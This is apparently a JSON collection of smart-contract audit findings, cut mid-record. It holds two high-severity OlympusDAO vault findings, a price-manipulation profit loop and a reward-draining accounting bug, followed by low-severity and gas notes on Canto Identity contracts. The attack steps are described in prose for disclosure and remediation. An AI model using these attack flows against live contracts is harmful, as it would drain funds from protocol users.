      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/110 \n\n## Found by \nBahurum, Bobface, KingNFT, cducrest-brainbot, 0x52, immeas\n\n## Summary\n\nAdversary can profit off of the single sided liquidity vault by depositing, buying OHM, withdrawing then dumping the profited OHM. This attack remains profitable regardless of the value of `THRESHOLD`.\n\n## Vulnerability Detail\n\nSingleSidedLiquidityVault#deposit allows a user to specify the amount of wstETH they wish to deposit into the vault. The vault then mints the proper amount of OHM to match this, then deposits both into the wstETH/OHM liquidity pool on Balancer. If the price of OHM changes between deposit and withdrawal, the vault will effectively eat the IL caused by the movement. If the price decreases then the vault will burn more OHM than minted. If the price increases then the vault will burn less OHM than minted. This discrepancy can be exploited by malicious users to profit at the expense of the vault.\n\nFirst we will outline the flow of the attack then run through the numbers:\n1. Deposit wstETH, which causes the vault to mint OHM as a counter-asset\n2. Buy OHM from the liquidity pool making sure to not go outside the price threshold to trigger the isPoolSafe check\n3. Withdraw wstETH\n4. Sell acquired OHM for a profit\n\nNow we can crunch the numbers to prove that this is profitable:\n\nThe only assumption we need to make is the price of OHM/wstETH which for simplicity we will assume is 1:1.\n\nBalances before attack:\nLiquidity: 80 OHM 80 wstETH\nAdversary: 20 wstETH\n\nBalances after adversary has deposited to the pool:\nLiquidity: 100 OHM 100 wstETH\nAdversary: 0 wstETH\n\nBalances after adversary sells wstETH for OHM (1% movement in price):\nLiquidity: 99.503 OHM 100.498 wstETH\nAdversary: 0.496 OHM -0.498 wstETH\n\nBalances after adversary removes their liquidity:\nLiquidity: 79.602 OHM 80.399 wstETH\nAdversary: 0.496 OHM 19.7 wstETH \n\nBalances after selling profited OHM:\nLiquidity: 80.099 OHM 79.9 wstETH \nAdversary: 20.099 wstETH\n\nWe can see that the adversary will gain wstETH for each time they loop this through attack. The profit being made i For simplicity I have only walked through a single direction attack but the adversary could easily drop the price to the lower threshold then start the attack to gain a larger amount of wstETH.\n\nNo matter how tight the threshold is set it is impossible to make this kind of attack unprofitable. Tighter thresholds just increases the amount of capital required to make it profitable. Another issue is that the THRESHOLD value can only get so small before the it starts causing random reverts for legitimate users.\n\nFor additional context, the fee charged by the pool only slightly impacts the profitability of this attack. Since the attacker only needs to manipulate the price within the threshold, fees scale linearly with THRESHOLD and therefore don't change the profitability of the attack.\n\n## Impact\n\nVault can be exploited for a nearly unlimited amount of OHM\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L187-L244\n\n## Tool used\n\nChatGPT\n\n## Recommendation\n\nThe only mechanism I can think of to prevent this is to add a withdraw/deposit fee to the vault\n\n## Discussion\n\n**unbanksy**\n\nThe auditor incorrectly assumes that the user receives OHM on withdraw:\n\n```\nBalances after adversary sells wstETH for OHM (1% movement in price):\nLiquidity: 99.503 OHM 100.498 wstETH\nAdversary: 0.496 OHM -0.498 wstETH\n``` \n\nThat is not the case as the OHM is burned by the protocol. @0xLienid right?\n\n**0xLienid**\n\n@unbanksy I don't think that's the assumption the auditor is making. Based on their math it seems they recognize that the user only gets the wstETH portion back based on these steps:\n\n```\nBalances after adversary sells wstETH for OHM (1% movement in price):\nLiquidity: 99.503 OHM 100.498 wstETH\nAdversary: 0.496 OHM -0.498 wstETH\n\nBalances after adversary removes their liquidity:\nLiquidity: 79.602 OHM 80.399 wstETH\nAdversary: 0.496 OHM 19.7 wstETH\n```\n\nI think the \"Balances after adversary removes their liquidity\" step might be wrong and the adversary should end up with 19.6016 wstETH which would make this not really profitable.\n\n**IAm0x52**\n\n@0xLienid The 19.7 is a typo. When they withdraw they get 20.0996 which makes their net 19.6016. So it should read 19.6 at that step not 19.7. When the user sells their OHM they net 0.499 stETH so the final balance is correct at 20.099 (19.6+0.499) and the attack is profitable.",
      "summary": "\nThis bug report is about the vulnerability found in the wstETHLiquidityVault, which is a part of the SingleSidedLiquidityVault. This vulnerability allows an adversary to profit off of the single sided liquidity vault by depositing, buying OHM, withdrawing then dumping the profited OHM. This attack remains profitable regardless of the value of THRESHOLD.\n\nThe attacker deposits wstETH, which causes the vault to mint OHM as a counter-asset. The attacker then buys OHM from the liquidity pool making sure to not go outside the price threshold to trigger the isPoolSafe check. After this, the attacker withdraws wstETH, and sells acquired OHM for a profit.\n\nThe only assumption needed to prove that this is profitable is the price of OHM/wstETH which is assumed to be 1:1. After the attack, the adversary will gain wstETH for each time they loop this through attack. The profit being made is 0.499 stETH. The fee charged by the pool only slightly impacts the profitability of this attack.\n\nThe impact of this vulnerability is that the vault can be exploited for a nearly unlimited amount of OHM. The only mechanism to prevent this is to add a withdraw/deposit fee to the vault. The discussion of this vulnerability was that the auditor incorrectly assumes that the user receives OHM on withdraw. It was clarified that the user only gets the wstETH portion back, and that the attack is profitable.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/110",
      "tags": [],
      "finders": [
        "Bobface",
        "0x52",
        "Bahurum",
        "immeas",
        "cducrest-brainbot",
        "KingNFT"
      ]
    },
    {
      "id": "6673",
      "title": "H-1: User can drain entire reward balance due to accounting issue in _claimInternalRewards and _claimExternalRewards",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/161 \n\n## Found by \nAymen0909, Bahurum, 0xlmanini, ABA, Met, carrot, chaduke, nobody2018, GimelSec, Bauer, KingNFT, cducrest-brainbot, 0x52, rvierdiiev\n\n## Summary\n\nThe `userRewardDebt`s array stores the users debt to 36 dp but in `_claimInternalRewards` and `_claimExternalRewards` the 18 dp reward token amount. The result is that `usersRewardDebts` incorrectly tracks how many rewards have been claimed and would allow an adversary to claim repeatedly and drain the entire reward balance of the contract.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L368-L369\n\nWhen calculating the total rewards owed a user it subtracts `userRewardDebts` from `lpPositions[user_] * accumulatedRewardsPerShare`. Since `lpPositions[user_]` and `accumulatedRewardsPerShare` are both 18 dp values, this means that `userRewardDebts` should store the debt to 36 dp. \n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L542-L545\n\nIn `_depositUpdateRewardDebts` we can see that `userRewardDebts` is in fact stored as a 36 dp value because `lpReceived_` and  `rewardToken.accumulatedRewardsPerShare` are both 18 dp values.\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L623-L634\n\nWhen claiming tokens, `userRewardDebts` is updated with the raw 18 dp `reward` amount NOT a 36 dp value like it should. The result is that `userRewardDebts` is incremented by a fraction of what it should be. Since it isn't updated correctly, subsequent claims will give the user too many tokens. An malicious user could abuse this to repeatedly call the contract and drain it of all reward tokens.\n\n## Impact\n\nContract will send to many reward tokens and will be drained\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L623-L634\n\nhttps://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L636-L647\n\n## Tool used\n\nChatGPT\n\n## Recommendation\n\nScale the `reward` amount by 1e18:\n\n        uint256 fee = (reward * FEE) / PRECISION;\n\n    -   userRewardDebts[msg.sender][rewardToken.token] += reward;\n    +   userRewardDebts[msg.sender][rewardToken.token] += reward * 1e18;",
      "summary": "\nThis bug report is about an issue found in the SingleSidedLiquidityVault contract, which is part of the Sherlock Audit 2023-02-olympus-judging project. The issue is that a user can drain the entire reward balance due to an accounting issue in the _claimInternalRewards and _claimExternalRewards functions. This was found by Aymen0909, Bahurum, 0xlmanini, ABA, Met, carrot, chaduke, nobody2018, GimelSec, Bauer, KingNFT, cducrest-brainbot, 0x52, and rvierdiiev. \n\nThe issue is caused by the `userRewardDebts` array storing the users debt to 36 decimal places but in `_claimInternalRewards` and `_claimExternalRewards` the 18 decimal place reward token amount is used. This means that `userRewardDebts` incorrectly tracks how many rewards have been claimed and would allow an adversary to claim repeatedly and drain the entire reward balance of the contract.\n\nThe code snippet from the SingleSidedLiquidityVault contract that is causing the issue is:\n\n```\nuint256 fee = (reward * FEE) / PRECISION;\n\nuserRewardDebts[msg.sender][rewardToken.token] += reward;\n```\n\nThis should be changed to:\n\n```\nuint256 fee = (reward * FEE) / PRECISION;\n\nuserRewardDebts[msg.sender][rewardToken.token] += reward * 1e18;\n```\n\nThe impact of this issue is that the contract will send too many reward tokens and will be drained. The tool used to identify this issue was ChatGPT. The recommendation is to scale the `reward` amount by 1e18 when updating the `userRewardDebts` array.",
      "quality_score": 3.6666666666666665,
      "rarity_score": 1.3333333333333333,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Olympusdao",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-olympus-judging/issues/161",
      "tags": [],
      "finders": [
        "Bauer",
        "0x52",
        "Bahurum",
        "Met",
        "ABA",
        "0xlmanini",
        "cducrest-brainbot",
        "Aymen0909",
        "KingNFT",
        "nobody2018",
        "chaduke",
        "rvierdiiev",
        "GimelSec",
        "carrot"
      ]
    },
    {
      "id": "23585",
      "title": "[N-07] Spellcheck",
      "impact": "LOW",
      "content": "\n* [existant -> existent](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L274)\n* [subprotocl -> subprotocol](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L306) and [here](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L318)\n\nConsider using the VSCode plugin `streetsidesoftware.code-spell-checker` or similar to help catch spelling errors during development.\n\n**[berndartmueller (judge) commented](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/75#issuecomment-1435963770):**\n > Great report! It is worth noting that the warden's effort went beyond automated and generic findings to consider the context of the protocol.\n>\n > I agree with all of the warden's findings. Thank you for your efforts!\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23584",
      "title": "[N-06] Use delete consistently",
      "impact": "LOW",
      "content": "\nConsider using `delete` instead of [`= 0;` in `CidNFT.remove`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L284) similar to how delete is used [here](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L269) even though it is also just a `uint` being cleared. Other parts of the code also seem to use `delete` for similar cases.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23583",
      "title": "[N-05] Inconsistent used of named return params",
      "impact": "LOW",
      "content": "\nPersonally I prefer named return params, but it is a style preference. However in a project, it's nice to be consistent throughout with whichever style you prefer.\n\n* [`SubprotocolRegister.getSubprotocol`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L106) does not name the return value while [`AddressRegistry.getCID`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L62) does, even though they are very similar functions.\n* [`CidNFT.tokenURI`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L136) and [`CidNFT.onERC721Received`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L344) do not use named return params while all the other getters in this contract do.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23582",
      "title": "[N-04] Consistent param ordering",
      "impact": "LOW",
      "content": "\nConsider switching the param order in the `SubprotocolRegistered` event or the `register` function so that they are more consistent with each other. e.g. in the function, the order/active/primary bits come first while in the event they appear after the `_nftAddress`.\n\nA possible improvement:\n\n```solidity\n    function register(\n        string calldata _name,\n        address _nftAddress,\n        bool _ordered,\n        bool _primary,\n        bool _active,\n        uint96 _fee\n    ) external\n```\n\nThe consistency improves readability, both for the code and for users reviewing transactions & events in a block explorer.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23581",
      "title": "[N-03] Emit from/to",
      "impact": "LOW",
      "content": "\nConsider emitting the original CID in [`AddressRegistry.CIDNFTAdded`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L48) for when a user overwrites a prior registration. This may add a little gas overhead, but it should be minor since the slot is warm by setting the value here as well.\n\nThis is similar to [ERC-173 (the ownership standard)](https://eips.ethereum.org/EIPS/eip-173) which emits both the previous and new owner on transfer. Including both CIDs would make any overwrites more explicit for the user and any observing apps. When there is no previous CID, that param would emit 0 (similar to previous owner emitted as address(0) when first assigned).\n\nAlternatively you could emit `CIDNFTRemoved` when there is a CID being overwritten. This approach would still offer the explicitness, but also be consistent with the `remove` flow, as if the user had made that call before the new `register` call.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23580",
      "title": "[N-02] Custom Error Params",
      "impact": "LOW",
      "content": "\nConsider emitting the current owner in [`AddressRegistry.NFTNotOwnedByUser`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L46). `msg.sender` is included but that may already be clear from context. Including the owner could be a useful addition, e.g. allowing a user to quickly realize that the NFT is in another wallet of theirs.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23579",
      "title": "[N-01] Simplify code",
      "impact": "LOW",
      "content": "\nThere is an if/else block in `CidNFT.add` for the `ACTIVE` type which could be simplified. Consider [changing this block of code](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L215-L226) into:\n\n```solidity\n// Check for duplicates\nif (lengthBeforeAddition != 0 && activeData.positions[_nftIDToAdd] != 0) {\n    revert ActiveArrayAlreadyContainsID(_cidNFTID, _subprotocolName, _nftIDToAdd);\n}\nactiveData.values.push(_nftIDToAdd);\nactiveData.positions[_nftIDToAdd] = lengthBeforeAddition + 1;\n```\n\nThis is easier to read and functionally the same. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "8883",
      "title": "[G-05] Unchecked when clearly safe to do so",
      "impact": "GAS",
      "content": "\nUsing `unchecked` blocks saves just a tiny bit of gas, but in instances where its clearly safe already it's possible to avoid this unnecessary check.\n\nIt's becoming a common pattern to use in `for` loops such as [this one in `CidNFT`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L150) where you could consider using:\n\n```solidity\nfor (uint256 i = 0; i < _addList.length; ) {\n    // existing logic\n    unchecked {\n        ++i;\n    }\n}\n```\n\nIn `CidNFT` when calculating fees the math is using a constant, so `cidFee` is always less than `subprotocolFee` making the subtraction always safe when calculating [`subprotocolFee - cidFee`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L193).\n\nIn `CidNFT` [`arrayLength - 1`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L279-L280) is guaranteed to be safe since there is a check [`if (arrayPosition == 0) revert...`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L275) above which handles the potential underflow scenario already.\n\n**[OpenCoreCH (Canto Identity) commented](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/76#issuecomment-1426259866):**\n > This was the most helpful report for me personally. The other reports often contained some generic recommendations that do not directly apply to the protocol (ERC721A instead of ERC721 which only helps with batch minting, changing uint96 which would use an additional storage slot in a struct, marking a string as immutable which is not possible, etc...). This report contains some nice refactoring suggestions that consider the context of the protocol.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#g-05-unchecked-when-clearly-safe-to-do-so",
      "tags": [],
      "finders": []
    },
    {
      "id": "8882",
      "title": "[G-04] Storage",
      "impact": "GAS",
      "content": "\nConsider a storage reference in `SubprotocolRegistry` for [`SubprotocolData memory subprotocolData`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L89). This would be cheaper in the case of `SubprotocolAlreadyExists` since that only accesses one of the two slots. And does not negatively impact the happy case. \n\nIt may be considered cleaner syntax since [`subprotocols[_name] = subprotocolData;`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L99) may then be removed, but that is subjective.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#g-04-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "8881",
      "title": "[G-03] Remove helpers",
      "impact": "GAS",
      "content": "\n[This block of code](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L244-L254) is redundant when passing from `add` -> `remove` which includes an external call to the `SubprotocolRegistry`. By moving the rest of the remove function into a private helper that's called by both `add` and `remove` you could save an extra call and therefor some gas in those scenarios, without complicating the code much.\n\nThis is related to the known gas optimization issue, but covers a redundant external call as well as the redundant sloads for approval checking.\n\nAdditionally you could use more targeted helpers. As a POC, here's the impact from extracting a `_removeOrdered` helper:\n\n```\noriginal:\n[PASS] testOverwritingOrdered() (gas: 281662)\n\nnew:\n[PASS] testOverwritingOrdered() (gas: 277991)\n\nSavings: 3,671\n```\n\nUsing the following helper which is called in `add` instead of the `remove` currently there. And this helper can be shared with `remove` so that the logic is not repeated in the contract.\n\n```solidity\nfunction _removeOrdered(\n    ERC721 nftToRemove,\n    uint256 _cidNFTID,\n    string calldata _subprotocolName,\n    uint256 _key,\n    uint256 _nftIDToRemove\n) internal {\n    delete cidData[_cidNFTID][_subprotocolName].ordered[_key];\n    nftToRemove.safeTransferFrom(address(this), msg.sender, _nftIDToRemove);\n    emit OrderedDataRemoved(_cidNFTID, _subprotocolName, _key, _nftIDToRemove);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#g-03-remove-helpers",
      "tags": [],
      "finders": []
    },
    {
      "id": "8880",
      "title": "[G-02] Revert on no-op",
      "impact": "GAS",
      "content": "\nUnfortunately it can be common for users to accidentally fire the same transaction multiple times. This can result from an unclear app experience, or users misunderstanding speed up / replace transaction. When this occurs the duplicate transaction should be a no-op, ideally reverting as early as possible to limit gas costs. Reverting in the case of a duplicate may also prevent the redundant transaction from being broadcasted at all since apps and wallets typically estimate gas before broadcasting and that would show that it's expected to revert if the original has already been mined.\n\nIn `register` consider reverting if the provided `_cidNFTID` is already registered by that user. \n\nThis is similar to the pattern already used [in `remove`, which reverts with `NoCIDNFTRegisteredForUser` when the call would otherwise be a no-op](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L54) (and this is not strictly necessary). \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#g-02-revert-on-no-op",
      "tags": [],
      "finders": []
    },
    {
      "id": "8879",
      "title": "[G-01] Move checks to the top",
      "impact": "GAS",
      "content": "\nChecks, effects, interactions is a general best practice and can be applicable to more than just reentrancy concerns. When one of the following error scenarios applies, users pay gas for all statements executed up until the revert itself. By performing checks such as these as early as possible, you are saving users gas in failure scenarios without any sacrifice to the happy case costs. \n\nMoving the requirements to the top of the function can also improve readability.\n\nConsider moving these checks to the top of the `register` function in `SubprotocolRegistry`:\n* [`if (!(_ordered || _primary || _active)) revert NoTypeSpecified(_name);`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L88)\n* [`if (!ERC721(_nftAddress).supportsInterface(type(CidSubprotocolNFT).interfaceId))`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L93-L94)\n\nAnd potentially moving [`SafeTransferLib.safeTransferFrom(note, msg.sender, cidFeeWallet, REGISTER_FEE);`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L87) below the check [`if (subprotocolData.owner != address(0))`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L90)\n\nIn `CidNFT` consider moving the check [`if (_nftIDToAdd == 0) revert NFTIDZeroDisallowedForSubprotocols();`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L183) to the top of the function.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#g-01-move-checks-to-the-top",
      "tags": [],
      "finders": []
    },
    {
      "id": "8878",
      "title": "[L-06] getActiveData could exceed gas limits",
      "impact": "LOW",
      "content": "\nThere's no upper bound on the size of the array which is being [returned in `CidNFT.getActiveData`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L319-L322). For both contract consumers and RPC requests, eventually a gas limit would be reached. Different RPC providers have different limits applied to view calls such as this.\n\nConsider supporting a paginated variation where callers can request a subset of the full array when appropriate, as well as potentially a getter to get the length of the array.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#l-06-getactivedata-could-exceed-gas-limits",
      "tags": [],
      "finders": []
    },
    {
      "id": "8877",
      "title": "[L-05] Consider `isContract` checks in constructors",
      "impact": "LOW",
      "content": "\nSeveral addresses are assigned in the contract constructors and assigned to immutable variables. A successful deployment is sensitive to these addresses being assigned correctly for the current network, and that addresses were specified in the correct order. Consider adding checks, as aggressively as possible for the use case, to help ensure the deployment configuration is correct.\n\n* [`AddressRegistry.constructor`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L37) consider requiring that `_cidNFT.isContract()`.\n* [`SubprotocolRegistry.constructor`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L66) and [`CidNFT.constructor`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L129) consider requiring that `_noteContract.isContract()`.\n* [`CidNFT.constructor`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L66) consider requiring that `_subprotocolRegistry.isContract()`.\n\n`.isContract()` is referring to the [OZ Address library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L40) or similar implementation.\n\nThis is related to the automated finding `[NC-1] Missing checks for address(0) when assigning values to address state variables` but suggests a more aggressive check.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#l-05-consider-iscontract-checks-in-constructors",
      "tags": [],
      "finders": []
    },
    {
      "id": "8876",
      "title": "[L-04] Consider requiring strings `.length != 0`",
      "impact": "LOW",
      "content": "\nSeveral strings in the system are assigned once, without the ability to change it later on. Consider requiring that these are non-zero length to help ensure these have been assigned as expected.\n\n* [SubprotocolRegistry.register](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L84) accepts a `_name` parameter of any length. Although only one entry could be registered with an empty name, it may be odd or unexpected to have a subprotocol with an empty string.\n* [CidNFT.costructor](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L122) accepts a `_baseURI` parameter of any length which is then immutable. If this were not assigned then `tokenURI` would not work as expected.\n* [`name` and `symbol` in `CidNFT.constructor`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L126) are allowed to be empty in the solmate constructor, may consider adding 0 length checks for these as well.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#l-04-consider-requiring-strings-length--0",
      "tags": [],
      "finders": []
    },
    {
      "id": "8875",
      "title": "[L-03] Consider a mutable baseURI",
      "impact": "LOW",
      "content": "\n`baseURI` is assigned in the constructor with no way of updating it in the future. The approach used by [`tokenURI`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L140) prevents using IPFS since that would require knowing all potential tokenIds in advance. It may work with Arweave's append only file system, but the intended baseURI protocol is not clear from the docs or tests.\n\nIf these are to be hosted on a custom domain, it may be even more important that the `baseURI` is mutable, allowing it to be transitioned to a new store if that domain were to become unavailable (such as due to a security incident, trademark issue, or the host otherwise becoming unavailable in the future).\n\nAlt: clarify in the docs the intended `baseURI`, to make it clear how permanence is guaranteed if that's part of the current launch plan.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#l-03-consider-a-mutable-baseuri",
      "tags": [],
      "finders": []
    },
    {
      "id": "8874",
      "title": "[L-02] Consider allowing fee wallet transfers",
      "impact": "LOW",
      "content": "\n`cidFeeWallet` in `SubprotocolRegistry` and `CidNFT` are currently immutable addresses. Allowing the fee recipient to be updated may be appropriate for future proofing such as to allow moving the fee recipient under DAO control, or similar change.\n\nYou could allow transferring to another address, potentially with a 2-step process. However this would increase gas costs as immutable could no longer be used.\n\nAn alternative which preserves the current gas efficiency, is to use a simple contract as the wallet which escrows funds that can be withdrawn by its owner, which potentially uses [the OZ Ownable2Step mixin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol). The owner could be an EOA at first, and as the system matures it could be changed to a multisig or a DAO in the future.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#l-02-consider-allowing-fee-wallet-transfers",
      "tags": [],
      "finders": []
    },
    {
      "id": "8873",
      "title": "[L-01] Consider allowing the subprotocol owner to be transferred",
      "impact": "LOW",
